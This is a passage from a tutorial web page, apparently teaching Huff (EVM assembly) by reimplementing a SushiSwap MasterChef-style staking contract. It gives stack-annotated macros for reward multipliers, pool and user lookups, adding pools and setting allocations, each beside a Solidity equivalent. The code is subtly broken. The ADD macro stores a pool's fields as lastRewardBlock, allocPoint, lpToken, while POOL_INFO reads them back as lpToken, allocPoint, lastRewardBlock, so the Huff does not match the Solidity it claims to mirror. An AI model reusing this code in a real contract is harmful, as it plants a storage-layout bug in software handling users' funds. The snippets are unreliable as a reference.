</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [bonusEndBlock, to, from]
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup4 lt
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [from &lt; bonusEndBlock, bonusEndBlock, to, from]
</span><span>
</span><span>    from_is_smaller_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// If from &lt; bonusEndBlock, jump to Case 3. Otherwise fall through to Case 2.
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [to, from]
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [to - from]
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>
</span><span>    from_is_smaller_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Case 3: from &lt; bonusEndBlock &lt; to (range spans bonus end)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [bonusEndBlock, to, from]
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 dup3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [bonusEndBlock, from, to, bonusEndBlock]
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [bonusEndBlock - from, to, bonusEndBlock]
</span><span>    </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [(bonusEndBlock - from) * BONUS_MULTIPLIER, to, bonusEndBlock]
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [to, bonusEndBlock, (bonusEndBlock - from) * BONUS_MULTIPLIER]
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [to - bonusEndBlock, (bonusEndBlock - from) * BONUS_MULTIPLIER]
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [(bonusEndBlock - from) * BONUS_MULTIPLIER + (to - bonusEndBlock)]
</span><span>
</span><span>    end_jump:
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: getMultiplier()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getMultiplier</span><span>(</span><span style=color:#0086b3>uint256 </span><span>from, </span><span style=color:#0086b3>uint256 </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(to </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> bonusEndBlock) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(to </span><span style=color:#a71d5d;font-weight:700>-</span><span> from) </span><span style=color:#a71d5d;font-weight:700>*</span><span> BONUS_MULTIPLIER;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(from </span><span style=color:#a71d5d;font-weight:700>>=</span><span> bonusEndBlock) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> to </span><span style=color:#a71d5d;font-weight:700>-</span><span> from;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(bonusEndBlock </span><span style=color:#a71d5d;font-weight:700>-</span><span> from) </span><span style=color:#a71d5d;font-weight:700>*</span><span> BONUS_MULTIPLIER </span><span style=color:#a71d5d;font-weight:700>+ </span><span>(to </span><span style=color:#a71d5d;font-weight:700>-</span><span> bonusEndBlock);
</span><span>    }
</span><span>}
</span></code></pre></div></div><p>The Solidity version uses if-else statements to handle the three cases of bonus period calculation.<hr><h4 id=pool-info-get-pool-information>POOL_INFO() - Get Pool Information</h4><p>Returns complete pool information for a specific pool ID including the LP token address, allocation points, last reward block, and accumulated SUSHI per share. This function demonstrates reading multiple sequential storage slots and returning multiple values through memory, with each value placed at a different memory offset (0x00, 0x20, 0x40, 0x60) to create a packed return data structure.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: POOL_INFO()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>POOL_INFO</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_id]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_id]
</span><span>    </span><span style=color:#969896;font-style:italic>// Validates pool_id &lt; poolLength
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calculates base storage slot for pool struct
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation in GET_POOL_SLOT
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpToken, pool_slot]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: lpToken (32 bytes)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [allocPoint, pool_slot]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x20]: allocPoint (32 bytes)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lastRewardBlock, pool_slot]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x40]: lastRewardBlock (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [accSushiPerShare]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x60 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x60]: accSushiPerShare (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x80 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 128 bytes from memory[0x00] (4 values  32 bytes)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: poolInfo()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>poolInfo</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(
</span><span>    </span><span style=color:#0086b3>address</span><span> lpToken,
</span><span>    </span><span style=color:#0086b3>uint256</span><span> allocPoint,
</span><span>    </span><span style=color:#0086b3>uint256</span><span> lastRewardBlock,
</span><span>    </span><span style=color:#0086b3>uint256</span><span> accSushiPerShare
</span><span>) {
</span><span>    PoolInfo </span><span style=color:#a71d5d;font-weight:700>memory </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> poolInfo[pid];
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>(pool.lpToken, pool.allocPoint, pool.lastRewardBlock, pool.accSushiPerShare);
</span><span>}
</span></code></pre></div></div><p>Solidity automatically packs multiple return values into ABI-encoded return data.<hr><h4 id=user-info-get-user-staking-information>USER_INFO() - Get User Staking Information</h4><p>Returns a user's staked amount and reward debt for a specific pool. This function demonstrates nested mapping access in Huff using the <code>GET_SLOT_FROM_KEYS_2D()</code> macro, which computes the storage slot for <code>userInfo[pid][user]</code> by hashing the keys together using the standard Solidity storage layout algorithm.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: USER_INFO()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>USER_INFO</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_address]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_id, user_address]
</span><span>
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [USER_INFO_SLOT, pool_id, user_address]
</span><span>
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Calculates storage slot for userInfo[pid][user]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation in GET_SLOT_FROM_KEYS_2D
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.amount, user_slot]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user_slot]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: user.amount (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [user.rewardDebt]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x20]: user.rewardDebt (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x40 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    </span><span style=color:#969896;font-style:italic>// Returns 64 bytes from memory[0x00] (2 values  32 bytes)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: userInfo()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>userInfo</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>address </span><span>user) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(
</span><span>    </span><span style=color:#0086b3>uint256</span><span> amount,
</span><span>    </span><span style=color:#0086b3>uint256</span><span> rewardDebt
</span><span>) {
</span><span>    UserInfo </span><span style=color:#a71d5d;font-weight:700>memory </span><span>user </span><span style=color:#a71d5d;font-weight:700>=</span><span> userInfo[pid][user];
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>(user.amount, user.rewardDebt);
</span><span>}
</span></code></pre></div></div><p>Solidity handles nested mapping lookups and tuple returns automatically.<hr><h4 id=add-add-new-pool>ADD() - Add New Pool</h4><p>Adds a new liquidity pool to the contract with specified allocation points and LP token address. This function is restricted to the contract owner using the <code>ONLY_OWNER()</code> macro and introduces several important concepts: the <code>stop</code> opcode which halts execution successfully without returning data (unlike <code>return</code>), the <code>sha3</code> opcode for computing Keccak-256 hashes used in storage slot calculations, and the <code>number</code> opcode which pushes the current block number onto the stack. The function also demonstrates complex storage manipulation for dynamic arrays in Solidity, using <code>sha3</code> to calculate the storage location of array elements based on the array's base slot. Conditional execution is handled via <code>jumpi</code> for optionally updating all pools and determining the appropriate lastRewardBlock based on whether rewards have started.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: ADD()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>ADD</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// Reverts if msg.sender != owner
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [allocPoint]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x44 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [withUpdate, lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero </span><span>no_update_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpToken, allocPoint]
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>        </span><span style=color:#969896;font-style:italic>// Updates all existing pools
</span><span>    no_update_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#0086b3>[START_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [startBlock, lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock, startBlock, startBlock, lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>gt iszero
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [startBlock >= currentBlock, startBlock, lpToken, allocPoint]
</span><span>
</span><span>    is_not_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [startBlock, lpToken, allocPoint]
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop number
</span><span>        </span><span style=color:#969896;font-style:italic>// Stack: [currentBlock, lpToken, allocPoint]
</span><span>        </span><span style=color:#969896;font-style:italic>// Use current block if we're past start block
</span><span>    is_not_bigger_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lastRewardBlock, lpToken, allocPoint]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 dup1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [allocPoint, allocPoint, lastRewardBlock, lpToken]
</span><span>
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [totalAllocPoint, allocPoint, allocPoint, lastRewardBlock, lpToken]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [totalAllocPoint + allocPoint, allocPoint, lastRewardBlock, lpToken]
</span><span>
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [allocPoint, lastRewardBlock, lpToken]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [lastRewardBlock, allocPoint, lpToken]
</span><span>
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength + 1, poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength + 1, poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[POOL_INFO_SLOT] = poolLength + 1
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>mul
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength * 4, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// Each pool struct has 4 storage slots
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [poolLength * 4, lastRewardBlock, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: POOL_INFO_SLOT (32 bytes)
</span><span>
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>sha3
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [keccak256(POOL_INFO_SLOT), poolLength * 4, lastRewardBlock, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// Base slot for array data
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_base_slot, lastRewardBlock, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage slot for poolInfo[poolLength]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup2 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_base_slot, allocPoint, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[pool_base_slot] = lastRewardBlock
</span><span>
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_base_slot + 1, allocPoint, lpToken]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup2 sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_base_slot + 1, lpToken]
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[pool_base_slot + 1] = allocPoint
</span><span>
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#969896;font-style:italic>// storage[pool_base_slot + 2] = lpToken
</span><span>    </span><span style=color:#969896;font-style:italic>// Note: accSushiPerShare (slot + 3) remains 0 (default)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>    </span><span style=color:#969896;font-style:italic>// Halt execution successfully
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: add()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add</span><span>(</span><span style=color:#0086b3>uint256 </span><span>allocPoint, </span><span style=color:#0086b3>address </span><span>lpToken, </span><span style=color:#0086b3>bool </span><span>withUpdate) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(withUpdate) {
</span><span>        </span><span style=color:#62a35c>massUpdatePools</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#0086b3>uint256</span><span> lastRewardBlock </span><span style=color:#a71d5d;font-weight:700>= block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number ></span><span> startBlock </span><span style=color:#a71d5d;font-weight:700>? block</span><span>.</span><span style=color:#a71d5d;font-weight:700>number :</span><span> startBlock;
</span><span>    totalAllocPoint </span><span style=color:#a71d5d;font-weight:700>=</span><span> totalAllocPoint </span><span style=color:#a71d5d;font-weight:700>+</span><span> allocPoint;
</span><span>    poolInfo.</span><span style=color:#62a35c>push</span><span>(</span><span style=color:#62a35c>PoolInfo</span><span>({
</span><span>        lpToken: lpToken,
</span><span>        allocPoint: allocPoint,
</span><span>        lastRewardBlock: lastRewardBlock,
</span><span>        accSushiPerShare: 0
</span><span>    }));
</span><span>}
</span></code></pre></div></div><p>Solidity handles dynamic array push operations and storage layout automatically.<hr><h4 id=set-update-pool-allocation>SET() - Update Pool Allocation</h4><p>Updates the allocation points for an existing pool, adjusting the total allocation accordingly. This function demonstrates chained macro calls with <code>SAFE_SUB()</code> and <code>SAFE_ADD()</code> operating on the same stack values, and shows how <code>sstore</code> can be chained to write to multiple storage locations efficiently. The function uses the <code>GET_POOL_SLOT()</code> macro to compute the storage location of a pool struct from its ID.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code: SET()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SET</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: []
</span><span>
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pid]
</span><span>    </span><span style=color:#969896;font-style:italic>// Validates pid &lt; poolLength
</span><span>
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newAllocPoint, pid]
</span><span>
</span><span>    </span><span style=color:#0086b3>0x44 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [withUpdate, newAllocPoint, pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero </span><span>no_update_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newAllocPoint, pid]
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>    no_update_jump:
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newAllocPoint, pid]
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot, newAllocPoint]
</span><span>    </span><span style=color:#969896;font-style:italic>// Memory[0x00]: used for sha3 computation in GET_POOL_SLOT
</span><span>
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [pool_slot + 1, newAllocPoint]
</span><span>    </span><span style=color:#969896;font-style:italic>// Points to allocPoint field
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 dup2 sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [oldAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]
</span><span>
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [totalAllocPoint, oldAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]
</span><span>
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>() </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [totalAllocPoint - oldAllocPoint + newAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]
</span><span>
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore sstore
</span><span>    </span><span style=color:#969896;font-style:italic>// Stack: [newAllocPoint, pool_slot + 1]
</span><span>    </span><span style=color:#969896;font-style:italic>// First sstore: storage[TOTAL_ALLOC_POINT_SLOT] = new total
</span><span>    </span><span style=color:#969896;font-style:italic>// Second sstore: storage[pool_slot + 1] = newAllocPoint
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent: set()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>set</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>allocPoint, </span><span style=color:#0086b3>bool </span><span>withUpdate) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(withUpdate) {
</span><span>        </span><span style=color:#62a35c>massUpdatePools</span><span>();
</span><span>    }
</span><span>    totalAllocPoint </span><span style=color:#a71d5d;font-weight:700>=</span><span> totalAllocPoint </span><span style=color:#a71d5d;font-weight:700>-</span><span> poolInfo[pid].allocPoint </span><span style=color:#a71d5d;font-weight:700>+</span><span> allocPoint;
</span><span>    poolInfo[pid].allocPoint </span><span style=color:#a71d5d;font-weight:700>=</span><span> allocPoint;
</span><span>}
